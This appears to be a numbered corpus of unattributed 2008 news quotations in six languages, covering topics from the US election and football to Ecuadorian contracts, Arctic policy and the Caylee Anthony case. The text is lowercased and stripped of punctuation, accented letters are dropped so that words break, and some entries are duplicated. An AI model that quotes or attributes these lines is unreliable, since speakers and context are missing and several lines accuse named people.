8606466 maar eerst moet je je natuurlijk opwarmen en de spieren losmaken ongeveer twintig minuten lang freezes zijn basisbewegingen footwork zijn bewegingen waarbij je met je voeten oefent en toprock is bewegen op muziek zelf maar vanuit een stilstaande positie de powermoves ten slotte zijn de algemene bewegingen de basisbewegingen op muziek die je onder de knie moet hebben als je jezelf een serieuze breakdancer wilt noemen
8606467 geef mij dan maar new york waar de sport vandaan komt vroeger trainden we geregeld aan het zuidstation maar daar werden we na verloop van tijd weggejaagd door de politie ergens kan ik dat wel begrijpen hier in het noordstation verlopen onze contacten met de politie overigens zeer goed ze komen zelfs vaak eens kijken als we bezig zijn met dansen

8606501 when we arrived at the stadium we were met by a friend of the family who was a transit cop again nothing occurred to me and i thought it was mere coincidence we spoke briefly and he called for someone on his radio another officer arrived and our friend told us to go with him now i knew something was going on the officer led us through areas of the stadium i had never been before and it seemed as though we were walking forever when we finally arrived at our destination wherever that was the cop pushed open a door and i found myself standing in the mets bullpen mouth agape i was completely and utterly overwhelmed my senses were bombarded by views and sounds i had seen only from a distance or on television met relievers bob apodaca and skip lockwood were warming up i can t remember what they said to me if anything but both signed my 1980 mets yearbook i was allowed on to the field briefly and there i encountered jerry morales so so hitting outfielder who also signed my yearbook i remember thinking how tall and sweaty he was last but certainly not least the officer prevailed on manager joe torre and coach joe pignatano to also sign for me again i have no memory of what they said to me i remember torre looking somewhat amused as soon as that little visit began it was over i took one last fleeting look at the stadium from a vantage point i would never have again and locked it away to see shea from that angle and with my ten year old sensibilities was like seeing a cathedral but from the altar very few memories have eclipsed that one baseball or otherwise

8606608 i did support hillary rodham clinton in the new york primary because ive been an admirer of hillarys for a long time shes been an excellent senator and of course i was slightly biased by the fact that she was a woman i never thought that in my lifetime i would have the pleasure of voting for a woman for president so i did vote for her in the primary but i always admired barack obama and when it became time for hillary to step aside and for obama to become the nominee i was very pleased to be able to support him and i prayed that he would pick joe biden for his vice president i thought that was the best possible choice
8606609 one of the benefits and pleasures of being an actor is having the opportunity to travel around the united states to travel overseas i began traveling to europe and asia when i was about 20 and the respect that our country had the regard that our country had throughout the world was so tremendous the embrace that youd receive just for being an american was extraordinary and over the last eight years during my travels ive seen that love for our country become so compromised that i dont know how well ever regain our stature in the world

8606678 we hope that some kids can see his life in our lyrics and can connect with that thats our goal as a band
8606679 qualunque strada tu scelga con chiunque tu scelga di condividerla mi basta che tu sia felice vorrei poter dire che questo il mio desiderio pi profondo ma in realt purtroppo non ho un carattere cos equilibrato la mia immagine cos come si riflette nei tuoi occhi insieme forte e delicata come quella di un eroe dei fumetti troppo perfetta per essere vera
8606680 ancora oggi continuo a pensare che ognuno sia artefice del suo destino
8606681 if i could dream at all it would be about you and im not ashamed of it
8606682 nequals1 thanks for this great post i wanted to give you a link to an interesting video of obama spending a day with a home health care worker to learn what she does in the course of a day i think you will find it interesting http www youtube com watch v jekiuj7bx2m
8606683 ted what i find even more amazing is that the ap story yesterday that highlighted many of the questions about corsi was written by nedra pickler
8606684 dirigo i think the perfect date for that meeting you suggest should be october 31
8606685 perhaps its all just a bit too new and too close to the convention to go gung ho on all out forgiveness
8606686 i was on the 16th st mall on monday and i have never seen so many police in one place all in black all shiny with gear i didnt like it at all but i was glad i saw it for myself

8606692 the board shall fill any such vacancy and a majority vote of all the remaining members of the board may fill any such vacancy
8606693 if weve done something procedurally wrong then well correct it
8606694 as a woman on the board i bring the interests of a mother
8606695 my kids tell me a lot about school and its always fun to hear things from their perspective thats what this is all about the kids
8606696 we had eight great candidates and we labored over the decision
8606697 i think her commitment to the schools that shes demonstrated at both putnam and washington spoke volumes to all of us as well as her commitment to investing in the future of marietta city schools
8606698 i have a passion for schools and ive always been interested in education and the issues in education
8606699 i dont come with any hidden agenda i have a very open mind and i just want the schools to be the best they can be
8606700 i think shes going to be a great addition to a great team
8606701 theres a real sense of togetherness moving the district ahead into greater possibilities
8606702 we are excited to share a beta version of gears for safari with you we would love for you to install it and test it and file bug reports so we can polish it and find all the corner cases

8606704 although it still summer we have to think of the colder months ahead
8606705 i know things are tough at the moment and people are worried about energy bills so i supported action to increase how much money older people get to help with heating costs
8606706 this year for households including someone aged 60 79 there will be an extra 50 this year bringing the total up to 250 and households with someone aged 80 or over will receive an extra 100 this year 400 in total to help older people cope with higher energy costs
8606707 if you claim by 19 september you should receive your payment before christmas
8606708 now is also the ideal time of year to check on the energy efficiency of your home proper insulation can make a real difference to your bills its hard to believe but as much as 1 in every 3 spent on heating bills is wasted in poorly insulated homes
8606709 id also encourage people to contact their energy suppliers to see whether they qualify for a reduced tariff and find out what they provide to improve energy efficiency
8606710 well what about you what sort of control do you have over your wife
8606711 ill tell you just the other night my wife came to me on her hands and knees
8606712 we had to do it for the fans because i think everyone is agreed that the fulham game was not the way we play
8606713 sometimes you cant play your game but its the way you behave on the pitch and the fans have always been there for us since the first day i came to arsenal
8606714 the defeat at fulham was a really big blow and we felt sorry about it but now it has passed and we have to do the right things for the fans
8606715 the main objective now is to win something this year
8606716 but if we can do it the way we play it is even better because football is to entertain people and to take pleasure and thats what we are doing at arsenal we have to win things i hope this year will be a good one but once again i am sure we can do it
8606717 saturday was a big disappointment and we have to remember what happened but we have to keep that behind and look forward
8606718 for a club like arsenal we have to be at the top and to be at the top you have to play with the right spirit so thats what we tried to do and we showed with the players we have got if everyone is playing the same way we can have a great result
8606719 i think last night he showed against twente that he is a great player
8606720 everyone has a bad time last year against birmingham i had a big mistake that was my thing of course william is a big player a more experienced player and he is the captain so you have to look for someone to blame
8606721 unfortunately it is him but i dont think the players think that is right we dont blame him for everything everyone makes mistakes i made a mistake like i told you and i think william is a great player and he scored again against twente everyone is behind him and it will remain like this
8606722 i think the big thing is to feel that you are wanted from your club your manager your team mates and the fans
8606723 its now the thursday in the week of a big test and we have not received this report
8606724 we need this report to look at the reasons for van der lindes sanction ive asked a lot of questions and the answers havent been forthcoming ive spoken to sa rugbys legal representative christo ferreira and he is currently following it up it really is quite astounding

8606763 das sind schon wichtige argumente die die russen immer wieder ins spiel bringen
8606764 dass russland derzeit berdenkt welche position es in zukunft vertritt wirtschaftliche einbu en die russland derzeit hinzunehmen hat wie etwa an der b rse und andere entwicklungen zeigen dass russland eben doch schon sehr stark internationalisiert ist und auch von einer solchen krise nicht immer profitieren kann

8606818 a lot of people say well what do you actors need why are you speaking up youre not people who need anything and its true were very blessed but almost all of us come from real middle class families and because we have the platform that we do it makes it a little bit easier for us to speak up speak out but everyone should really be doing it mostly im just here because im a bleeding heart liberal and a concerned citizen and i cant wait to hear the speeches every election is historic but this one is particularly so and so im so excited to be here
8606819 i dont feel very good about the last eight years and i feel like were in a place where we really need theres a lot of damage that we need to recover from and we need a very strong and inspirational leader to bring us out of this its pretty grim
8606820 i did support hillary rodham clinton in the new york primary because ive been an admirer of hillarys for a long time shes been an excellent senator and of course i was slightly biased by the fact that she was a woman i never thought that in my lifetime i would have the pleasure of voting for a woman for president so i did vote for her in the primary but i always admired barack obama and when it became time for hillary to step aside and for obama to become the nominee i was very pleased to be able to support him and i prayed that he would pick joe biden for his vice president i thought that was the best possible choice
8606821 one of the benefits and pleasures of being an actor is having the opportunity to travel around the united states to travel overseas i began traveling to europe and asia when i was about 20 and the respect that our country had the regard that our country had throughout the world was so tremendous the embrace that youd receive just for being an american was extraordinary and over the last eight years during my travels ive seen that love for our country become so compromised that i dont know how well ever regain our stature in the world

8606833 we are in very good shape in terms of the progress of the overall asean plus one process

8606866 the goal of the video games defense is to both shift blame and to explain to a judge and jury why this good kid is suddenly acting like a terrorist
8606867 portraying your client as the victim of outside forces be they child abuse coercion by peers or an ultra violent video game industry humanizes the client and shifts the culpability
8606868 while i dont believe that violent video games tend to have any negative effects on otherwise healthy people my job is to present any theory to a jury that would explain why my client did the things he did
8606869 a good defense lawyer will blame everyone in sight except of course the client when he or she runs out of people to blame its time to look around for objects what could be better than a popular videogame

8606874 once again mariotti was playing fast and loose with the facts
8606875 mariotti spent the better part of his first day divorced from the sun times acting like a scorned lover
8606876 mariotti wouldnt have signed that extension if the things hes saying about the sun times now were true so hes spinning again
8606877 those of us who work at newspapers have one edge over the blogging world we have access to the players coaches managers and front office executives we can talk to key figures on and off the record to get insight unavailable to others
8606878 jay mariotti blasted his former papers internet ineptness going as far to say that it had a rickety website and his usa spain gold medal basketball game column sat in a bin for three and a half hours because nobody was at the paper to read it
8606879 just back from beijing where he covered the olympics mariotti said in a phone interview that he decided to quit after it became clear while in china that sports journalism had become entirely a web site business there were not many newspapers there he added that most of the journalists covering the games were there writing for web sites
8606880 were not hearing from grief stricken fans the truth is quite the opposite quite the opposite weve gotten hundreds of e mails including ones that say now well buy the paper by all indications our circulation will go up
8606881 it was agreeable to both sides from picos side of things we were happy with the results of the mediation and the city certainly got some things out of it that they wanted
8606882 the business relationship between the city and pico will not only continue but we agreed to expand it and there are several expansion options being considered
8606883 what the court finds most astonishing about this situation is the relative position of the parties and use of smoke and mirrors to try to overlay something but what it really comes down to is that somebody is ticked off because robert kusenberger is getting 1 500 a month from fedex now thats what its all about
8606884 any future disputes will immediately go to mediation and there will be no more lawsuits unless mediation just breaks down
8606885 the settlement that was reached today was fair to both sides
8606886 mike wrob was there and my understanding is that he will present it to city council on sept 9 everybody signed a draft copy of the settlement and both law firms are collectively working up the final agreement
8606887 and then a brief is prepared to send to the fourth circuit court of appeals with a request to stop all action
8606888 everything is contingent on city council approval and thats set for sept 9 so technically the settlement is tentative but we were able to work out a deal and everyones happy about it

8606894 hip crates j dizia que para estudar medicina preciso estudar o clima a mudan a clim tica teria efeitos diretos e indiretos sobre a sa de das pessoas diretos com os desastres as inunda es as secas mas tamb m indiretos com as doen as
8606895 entre a segunda metade dos anos 1970 e os anos 2000 a mudan a clim tica foi respons vel por aproximadamente 150 000 mortes suplementares por ano ela atingiu de modo esmagador as popula es mais pobres segundo nossas estimativas os dados devem aumentar e ainda estamos considerando apenas uma parte das causas de mortes decorrentes da mudan a clim tica somente a parte imersa do iceberg
8606896 neste ritmo o n mero de mortos causados diretamente pela mudan a clim tica ficar em milh es daqui 20 anos
8606897 j temos um grande problema de mal ria e a mudan a clim tica vai torn lo ainda mais dif cil a temperatura influencia sobre a sobreviv ncia dos mosquitos e sobre os parasitas que transmitem a mal ria dos mosquitos em geral quando mais calor mais alta a taxa de infec o
8606898 em in meros casos a bact ria que infecta a gua ou o alimento sobrevive melhor a uma temperatura mais elevada mas o aumento do n mero de inunda es e sobretudo das secas vai contaminar as fontes de gua por exemplo em per odos de seca as pessoas estocam gua durante muito tempo e lavam menos as m os
8606899 uma de nossas maiores preocupa es a subnutri o este o principal fator de m sa de e ela mata 3 5 milh es de pessoas por ano com a mudan a clim tica a produ o de alimentos deve aumentar ligeiramente em pa ses ricos mas deve cair em torno do equador os que mais precisa de alimentos ter o menos
8606900 concordamos com esta constata o mas existe um desafio como se desenvolver e poluir menos dif cil
8606901 os pa ses africanos s o os que menos contribu ram para a mudan a clim tica e s o eles que sofrem mais
8606902 n s n o queremos em caso algum comprometer a luta contra a pobreza nos pa ses mais pobres os pa ses ricos que contribu ram para a maior parte do problema devem dar o primeiro passo

8606907 o tema de alt ssima sensibilidade mas n o devemos apelar para as emo es e sim para a racionalidade o aborto n o um assunto que se limita a ser pol mico a discuss o sobre anencefalia reacende o tema que parecia ter sido postergado deus d a todo ser humano o direito ao livre arb trio defendemos que a escolha seja da mulher

8606915 for 15 months mr gurung was held in iraq against his will before kbr and daoud allowed him to return home to nepal
8606916 allege that the illicit trafficking scheme from their recruitment in nepal to their eventual employment in iraq was engineering by kbr and its subcontractor
8606917 so it is premature for us to comment at this time
8606918 in no way condones or tolerates unethical or illegal behavior
8606919 if someone rides up to a convenience store with a sawed off shotgun and a prior record im not intimidating anybody by calling the cops if this republican campaign is going to be run in mccarthyite fashion by lawbreakers in an illegal way they are going to pay a price
8606920 why would barack obama be friends with somebody who bombed the capitol and is proud of it
8606921 if you cant get excited about voting for mccain these are the kinds of ads that get them excited about voting against obama
8606922 if he thinks his long association with an unrepentant domestic terrorist is nothing the american people should be concerned about hes delusional or naive
8606923 a knowing and willful attempt to evade the strictures of federal election law
8606924 the obama campaign has raised this to front page news frankly with this response ad with these legal attacks with their outreach to reporters
8606925 last night hillary told us in no uncertain terms that she is going to do everything she can to elect barack obama

8606927 barack obama is ready to preserve protect and defend the constitution of the united states barack obama is ready to be president of the united states
8606928 i know you hear that phrase a lot in politics i mean it
8606929 these times require more than a good soldier they require a wise leader
8606930 if im not mistaken hillary clinton rocked the house last night
8606931 and president clinton reminded us of what its like when you have a president who actually puts people first thank you
8606932 with eyes firmly fixed on the future in the spirit of unity with the goal of victory with faith in our party and country lets declare together in one voice right here and right now that barack obama is our candidate and he will be our president
8606933 i move that senator barack obama of illinois be selected by this convention by acclamation as the nominee of the democratic party for president of the united states
8606934 you all sit down we have to get on with the show
8606935 with joe bidens experience and wisdom supporting barack obamas proven understanding instincts and insight america will have the national security leadership we need
8606936 the republicans will nominate a good man who served our country heroically and suffered terribly in vietnam
8606937 he loves our country every bit as much as we all do as a senator he has shown his independence on several issues but on the two great questions of this election how to rebuild the american dream and how to restore americas leadership in the world he still embraces the extreme philosophy which has defined his party for more than 25 years
8606938 they actually want us to reward them for the last eight years by giving them four more
8606939 lets send them a message that will echo from the rockies all across america thanks but no thanks
8606940 im not giving a lesson on accountancy but you do write money off over the term of a contract
8606941 what we pay is in an investment during that period you have a player who is doing a job and in this industry you buy and sell players
8606942 you have to look at these things pragmatically sometimes these things dont work as well as you want them to

8606978 he lives a quiet relaxed life focused on being a tennis player but he is obsessed with video games i dont play video games
8606979 people expect me to be bitter but im not look around and youll see how many coaches get fired
8606980 we still speak he is now doing a lot of things i was asking him to do like being much more aggressive and stop hitting so many damn drop shots

8607007 it is not going to be so easy this time around
8607008 there is virtually no public support for an attack on iran
8607009 its harder for pro israel groups to avoid the charge that they are indifferent to american interests and they have the added difficulty of being aligned with the christian zionists some of whom are openly calling for war with iran

8607142 eine sprache des populistischen aufwiegelns dumpfer ressentiments die abschreckend und absto end wirkt und nicht in eine demokratische kultur der aufkl rung passt
8607143 derartige sprachliche entgleisungen samt ihrer beabsichtigten ffentlichen wirkung sind unertr glich
8607144 umso mehr w re es angebracht dass auch du dich wenigstens so artikulierst dass aus der von dir vorab behaupteten schwersten besch digung nicht ein mutwillig herbei geredeter schwerer schaden f r die spd wird
8607145 diese unselige und unw rdige bemerkung aus der welt zu schaffen
8607146 das kommt davon wenn man einen b rovorsteher zum ministerpr sidenten macht

8607160 which is referred to in the first and most important sentence of the 28th amendment of the constitution bill would be quite otherwise in this and other respects

8607163 its a dangerous business frodo going out your door you step onto the road and if you dont keep your feet theres no knowing where you might be swept off to
8607164 if you have something to say to me say it to my face thats what i have believed my whole life dont be a coward and say it to others first let alone all the media in the world i think we know where the rest of this blog is going
8607165 if you guessed it had to do with my father then you guessed right
8607166 he has become a public embarrassment and a bully he has no idea what is going on in my life because i have chosen not to involve him in it his recent attack on my life and my loved ones is simply for an addiction that he has fame
8607167 this past weekend the crew headed to cabo and it was so beautiful lauren and i were the only girls it was brodys birthday so all of his friends were there as well we stayed at the amazing lg house on the beach and we filmed there so you guys will all get to see our adventures on
8607168 he was cut on the back of his head blood was coming out the side of his mouth and his lip was cut

8607171 their availability to invest in the project to relaunch alitalia
8607172 we are anxious to know exactly how many layoffs are planned for alitalia
8607173 in 2011 i think canadians should not expect everything in kandahar will be fixed
8607174 i think it will look pretty much as it does now but the key difference will be that afghan institutions afghan army and police and government will actually be in charge and in the lead in building from what we helped them build together over the last few years
8607175 this is a fund raising show for the people in chin state who are facing hardships the singers are performing voluntarily all the proceeds from the sale of tickets will go to the famine relief fund
8607176 it is very difficult for chin people in burma to help the needy as they themselves are starving the international community of churches and chin churches are doing their utmost to help famine victims so the chin community in exile has come together to join fellow chins from burma to help chin people

8607178 its great to compete at this level against our military compadres from around the world
8607179 they just have such a large pool to draw from theyre hard to beat
8607180 this precious little angel from above gave me strength and unconditional love
8607181 anthony posted the message while she was apparently watching american psycho a horror movie about a new york executive who is also a serial killer
8607182 shes been lying about a lot of stuff and stole money from her and her grandmother
8607183 i feel like the person were talking about now and the person i knew before are two different people
8607184 unless we start getting the truth were going to announce two possibilities with caylee either you gave caylee to someone that you dont want anyone to find out because you think youre a bad mom or something happened to caylee and caylees buried somewhere or in a trash can somewhere and you had something to do with it either way right now its not a very pretty picture to be painting
8607185 everything youve told us is a lie every single thing
8607186 i didnt want to involve a bunch of people that maybe didnt know the situation the biggest mistake was not calling you guys right off the bat but the worse sic is ive done this to my daughter by allowing her to still be with a baby sitter
8607187 we are extremely excited at the prospect of bringing beach polo back to poole
8607188 sandbanks fabulous beach is a great venue and we are very happy to be staging the championships in poole until 2013
8607189 this years event attracted a lot of local interest and promoted sandbanks and poole on the national stage
8607190 we hope the event goes from strength to strength over the next five years
8607191 he gave us all a tongue lashing he said that this is unacceptable
8607192 he said if i had it my way they would be fired on the spot
8607193 when alan was talking to me he said its a horror on staten island its the regular routine
8607194 although web 2 0 is now entering the trough of disillusionment it will emerge within two years to have transformational impact as companies steadily gain more experience and success with both the technologies and the cultural implications
8607195 later in between two and five years cloud computing and service oriented architecture soa which is moving up the slope of enlightenment will deliver transformation in terms of driving deep changes in the role and capabilities of it finally public virtual worlds which are suffering from disillusionment after their peak of hype in 2007 will in the long term represent an important media channel to support and build broader communities of interest
8607196 yes kelly from kansas city you are on the air
8607197 weve anticipated that bankruptcies would go up because people want to try to save their properties
8607198 bankruptcy laws even though theyve become more stringent are often the last place to turn to try to hold on to the home youve worked hard for
8607199 the continued rise in bankruptcies to their highest levels since congress changed the law points to the growing strain on family budgets
8607200 we expect this trend to continue through the end of the year with cases surging past 1 million by year end
8607201 falling house prices rising unemployment tightening credit standards and high food and fuel prices will continue to depress consumer spending
8607202 si el gobierno del presidente uribe empieza a mostrar constancia y coherencia en su posici n respecto del ecuador creo que evidentemente habr caminos viables para restablecer las relaciones
8607203 en estos ltimos dos meses o mes y medio hemos vuelto a un cauce un poco m s tranquilo
8607204 tenemos la esperanza de que todo va a ir mejorando y que se pueda conversar con mayor tranquilidad
8607205 para nosotros es fundamental que el gobierno de colombia demuestre seriedad en sus propuestas en sus compromisos
8607206 en las pr ximas semanas habr una reuni n a nivel de vicecancilleres
8607207 insisto en la necesidad del compromiso que requerimos de colombia para que cumpla su parte de responsabilidad en el tema
8607208 si ese proceso se hallan porque los se ores isa as paguen en una negociaci n transparente a la luz p blica yo no me opongo
8607209 supongo que en los otros pa ses no encontraron el para so de la corrupci n que hay en el ecuador
8607210 no se sabe de qu fecha pero poco a poco seguramente con la complicidad de recibir y exigir chantajes de muchos funcionarios del ecuador resulta que esta empresa tiene ramificaciones muy amplias en el pa s
8607211 por eso es que cuando el presidente les advirti que iban a perder todo es que se dieron cuenta lo que les dijo personalmente tienen que entender que se acab
8607212 el problema estuvo en que el gobierno de sixto dur n ball n cambian las normas de la contrataci n p blica y quieren privatizarlo todo y privatizan al sector energ tico y se cambia la ley del sector el ctrico y se permite hacer concesiones y este es uno de esos contratos en el que se da una concesi n a esta empresa
8607213 firm un contrato el stico que lo fueron estirando sin que se llegara a romper
8607214 ese el stico fue creciendo y en la poca de lucio guti rrez estaba m s flexo que nunca y entonces ese contrato tiene 10 adedums agregados para cambiar varias cosas y recibir hasta llegado el caso a 100 millones de d lares m s
8607215 estas cosas no se ponen con escritura p blica sino que no aparecen los documentos
8607216 no tiene que preocuparse si la obra la hacen bien o mal
8607217 ahora cuando se suspendi el servicio se evacuaron las aguas se pudo hacer una inspecci n en los t neles y se descubri que no estaba todo cubierto de hormig n ahora lo est n recubriendo
8607218 tienen que pagar un lucro cesantes que est fijado en 200 mil d lares diarios desde el d a que se da 6 de junio hasta el d a que entreguen la planta reparada que ellos de acuerdo a un cronograma han establecido que ser hasta el 4 de octubre
8607219 pero adem s del precio que ellos dieron dijeron que tienen que hacer un reajuste de precios por los dos a os y cobraron 17 millones de d lares por reajuste de precio
8607220 odebrecht se queda con el 20 de las acciones adem s financi el estado ecuatoriano ellos solo construyeron y por iniciativa de todo este proceso se quedan con el 20 de las acciones despu s se las venden al estado ecuatoriano y lo m s sarc stico es que la obra se contrata en d lares ellos que su financiamiento es en reales brasileros entonces tienen que cobrar un diferencial bancario por cambio monetario de reales a d lares nosotros tenemos que pagar las variaciones de ese diferencial cambiario y son casi unos 20 millones
8607221 estamos esperando discutir y negociar pero ya cuando se dieron cuenta de que la cosa estaba e serio sobre todo a ra z de una reuni n que hubo en la presidencia de la rep blica la cual dio cuanta el presidente
8607222 johans torn his hamstring and matt has broke his toe and they will be out for a while its disappointing for johan and from our own point of view its a big blow because hes set off remarkably well but it happens and we get on and deal with it
8607223 how are people finding life change and purpose through the experience
8607224 massimo oddo is a player who covers the whole right hand side
8607225 for us hes a huge quality boost because of his experience and his tactical and technical skills hes a great enhancement to the squad
8607226 were happy to have massimo oddo who is an experienced and successful defender
8607227 another world cup and champions league winner in bayerns ranks will help us to succeed
8607228 if there someone qualified to coach bar a then that is pep guardiola because he knows the club inside out
8607229 i have something to prove i joined valencia when i was in great form having just won some trophies i was an international with brazil had won the world cup and i thought i could bring a lot to the team
8607230 but the injuries have meant that people forgot all of that and that they begin to have their doubts
8607231 it does hurt because i know what i can do i feel great now and i hope to have the chance to play and have a regular run of games
8607232 the atmosphere has been great since the start of pre season and it is great that two great players are staying
8607233 a pronounced contrast between the eye area and the skin is a symbol of femininity
8607234 the first one was definitely unexpected and a bit of shock
8607235 in 03 i think it all came a bit too soon
8607236 when we came out of the end of the year and we had won a championship i dont think we knew what wed actually achieved and now knowing what goes into it and the rewards that go to the guys and everybody who helps thats the biggest part of it
8607237 if we do win a championship it would mean a ton more than 03 i think
8607238 the drought seasons in 04 and 05 definitely make you respect things a lot more feel gifted in that you have the opportunity
8607239 so anytime you even win a race you thrive on it a little more
8607240 i think you definitely get recognized a lot more especially in indy which is where i live
8607241 theres such a history there and people love that race
8607242 i think if helio wins the next two races we just have to place fourth so we should be able to do that
8607243 we just have to stay behind him were ok we have a long way to go yet
8607244 i guess we just need to shrug it off and come back strong next week
8607245 we just need to keep doing what weve been doing all year and well be fine
8607246 in terms of this season i think everything that hes done and weve had success together in the past is the result of all of those years of working hard day by day
8607247 its not something that just fell into place its his experience level all the things that hes managed to gather up in his data bank of experience is paying large dividends
8607248 with his ability to adapt his driving style to the racetracks that we have today in this series hes at the right place at the right time with the right team i think we were on the edge of it last year and i think his experience the whole last year was just at the point where it was starting to work well but this year scotts really been able to capitalize on that
8607249 its the same people and theyre obviously doing the same things that they were and maybe its a combination of all the small things have probably come through a little better
8607250 last year we were decent i think we just werent aggressive enough in the first part of the season and thats where we lost a lot of it and had to try and pull it back with six races to go
8607251 i think this season we started strong any season you win a indy 500 definitely gives you a lot of confidence and a lot of motivation for the rest of the year but i also think everybodys just been nailing it the engineering has been extremely good the pit stops have been fantastic where we have struggled a little bit weve mostly been able to come out with pretty good finishes
8607252 with the regeneration agency now actively working to improve estates and communities i believe we should not be selling off sites to potential developers who will build apartments with no proper community facilities leading to more problems in future years and there are hundreds of poorly designed houses and apartments with serious social and criminal issues affecting the quality of peoples lives in nearby areas
8607253 by providing this land to the regeneration agency the city council would be making a positive contribution to the upgrading of the area and improving the lives of the local people many families now in ballinacurra weston were moved from this area 50 years ago and they or their descendants would welcome the opportunity to return to new homes in careys road
8607254 comprehensive immigration reform that keeps open the doors of opportunity in our country usa
8607255 his fathers own experience has informed his own views on the issue and he had seen the enormous contributions that irish immigrants have made to this country in 2006 obama marched in chicago on behalf of immigration reform walking shoulder to shoulder with many irish americans who shared their own personal stories of hope and opportunity
8607256 this is fantastic news for everyone who has any dealings with the undocumented irish in the us weve been trying to get some movement on this issue for a long time and im delighted to see senator obama has recognised the plight of these irish workers who have helped make america the country it is today
8607257 this is part of our expansion programme with over 10 500 sq feet of floor space we will be nicely positioned not only to meet the requirements of our existing large client base but to welcome new customers as well
8607258 we will of course continue to operate from oconnell street but the parkway gives us more options the entire castletroy area has grown in recent years as have newport murroe nenagh all of which are in the immediate catchment area
8607259 there is a lot of talk about recession around and yes people have become more cautious with their money but we have sufficient confidence in the future of the mid west by extending our operation
8607260 to be fair to kielys they ran a very good business at the parkway and we believe we can build on that we will be offering a full range of electrical and white goods we are answering the call of our clients in a new move for us we will be having late night openings and sunday trading at the parkway late opening and sunday trading never really worked in the city centre
8607261 a citizen sees the beating in a parking lot police get there fast they see him beating her its a good solid case
8607262 he was on top of her actually in the act of violently beating her when the officers arrived with the knife in his hand
8607263 the victim purposely grabbed the steering wheel and caused the vehicle to hit the curb
8607264 the ship would be pushed by the spatial bubble and the bubble would be travelling faster than the speed of light
8607265 the problem with this and previous schemes including my own is that part of the exotic matter would have to travel faster than the local speed of light roughly speaking it would need to go faster than the speed of light with respect to the portion of space it occupies and thats not allowed by any established physical theory
8607266 during the august recess i have been from one end of georgia to the other and the number one issue i hear about continues to be the high cost of fuel
8607267 we have a real opportunity to get something done by working together and i am so pleased to announce that our bipartisan group has added more senators to it and i feel confident we will continue to see it grow once we resume session after labor day the american people are looking for action on the energy crisis they are not looking for a political issue they simply want to be able to make ends meet without having to make difficult budget decisions
8607268 we all feel a sense of urgency to help ease fuel prices in the short term while addressing our long term needs this comprehensive bipartisan framework is now backed by a gang of 16 because it puts every option on the table
8607269 esta no fue una guerra que elegimos no tenemos inter s en el territorio
8607270 cre a l que rusia se quedar a a un lado mientras sus tropas
8607271 puede imaginarse lo que fue para los abjasos ver cerrada su universidad de sujumi por el gobierno de tiflis bajo el argumento de que supuestamente no ten an una lengua adecuada o una historia o cultura por lo que no necesitaban una universidad
8607272 argumentamos constantemente que ser a imposible despu s de esto decirle a los abjasos y osetas y decenas de otros grupos en todo el mundo que lo que era bueno para los albano kosovares no era bueno para ellos en las relaciones internacionales no se puede tener una regla para unos y otra para otros
8607273 en relaci n con el reconocimiento de la independencia sobre el que los l deres de los estados interesados fueron informados por la parte rusa incluso antes de la firma del correspondiente decreto del presidente medv dev dio explicaciones detalladas sobre la postura rusa
8607274 todos los estados deber an tener el derecho a vivir de forma independiente y la integridad territorial constituye uno de los principios fundamentales que hay que observar
8607275 lo que est en juego en este conflicto es absolutamente esencial
8607276 lo que fue de aplicaci n en los balcanes no lo es en el caucaso
8607277 en este colegio pedimos 160 becas y nos dieron s lo 32 por eso se decidi hacer una movilizaci n el viernes a las 13 nos vamos a encontrar en congreso y desde ah marcharemos
8607278 mateadas choripaneadas y diversas actividades mientras se esperaban respuestas del gobierno porte o
8607279 i think what sen obama wants to do is make sure everyone watching at home is going to have a clear sense of where he wants to take the country that were on the wrong path and barack obama is going to put us back on the right track both here at home and overseas
8607280 this roman like facade a facade with roman columns is a perfect metaphor or icon for the point that its an interesting production but behind it theres not much there
8607281 my goodness its amazing that were three days into the democratic convention and 60 or so days from the actual election and theyre still trying to plead with the american people and convince us that barack obama is ready to be president
8607282 and it becomes obviously an even greater moment in november if hes elected
8607283 i have a dream that one day this nation will rise up and live out the true meaning of its creed we hold these truths to be self evident that all men are created equal
8607284 my fellow democrats america can do better than that and barack obama will do better than that
8607285 these times require more than a good soldier they require a wise leader
8607286 a leader who can change the change that everybody knows we need
8607287 was ihr auch immer in meinem namen bitten werdet das werde ich wirken
8607288 youre going to have to come back here later when you have three hours
8607289 this is not a coincidence this pregnancy is part of your apprenticeship
8607290 i am not the reason that he has no contact with his daughter he is
8607291 so desperate for attention that he goes to the media whenever possible
8607292 people never even knew who samantha ronson was until she met lindsay she was just some los angeles dj and now shes writing a book
8607293 there is not now and never will be a tell all written by me
8607294 i want him to stop talking to the media about the people i love
8607295 i feel no need to publicly defend my role in lindsays life
8607296 im just sorry that lindsay likes me more than him
8607297 i just told him today youre the love of my life
8607298 i dont want anybody thats been in my life before in my life anymore
8607299 i dont even want them to have any way of contacting me
8607300 i just love so i dont understand when people cant do exactly what i do

8607311 the members of the agonist have always believed in the power of song now you can prove it
8607312 whether it is the thawing of the northwest passage or the suspected resource riches under the arctic seabed more and more countries are taking an interest in the waterways of the canadian arctic
8607313 we will be sending a clear message to the world that our environmental standards and sovereignty are not up for debate if you are in canadas arctic you will be playing by canadas rules
8607314 as an environmental matter as a security matter and as an economic matter we are making it perfectly clear that not only do we claim jurisdiction over the canadian arctic we are also going to put the full resources of the government of canada behind enforcing that jurisdiction
8607315 we are acting today to protect our environment improve the security of our waterways and ensure that all northern residents and in particular the inuit have a strong say in the future of our arctic for generations to come

8607318 to develop the north we must know the north to protect the north we must control the north and to accomplish all our goals for the north we must be in the north

8607324 yeah but your scientists were so preoccupied with whether they could they never stopped to think if they should
8607325 its unfortunate that the democratic majority found a way to extend authorization for the federal aviation administration but given the chance to extend the current medicare fee levels they objected twice
8607326 doctors and seniors deserve a serious and responsible effort that addresses the impending fee cut without playing politics and creating a major expansion of entitlement spending i will continue to work to provide doctors the relief they deserve and seniors the benefits they deserve
8607327 i am very pleased the administration is giving congress more time to work out reasonable legislation to eliminate this 10 percent cut in medicare payments to doctors i will do everything i can to see to it that the senate quickly passes a bill that helps georgia doctors and that helps georgia medicare beneficiaries especially our seniors and those who live in rural areas
8607328 the economics are counter intuitive temporarily restrict supply to increase uptake
8607329 this is not what we wanted to find but it has been our solid experience over two years and is a known paradox in economics
8607330 given that wikileaks needs to restrict supply for a period to increase perceived value to the point that journalists will invest time to produce quality stories the question arises as to which method should be employed to apportion material to those who are most likely to invest in it
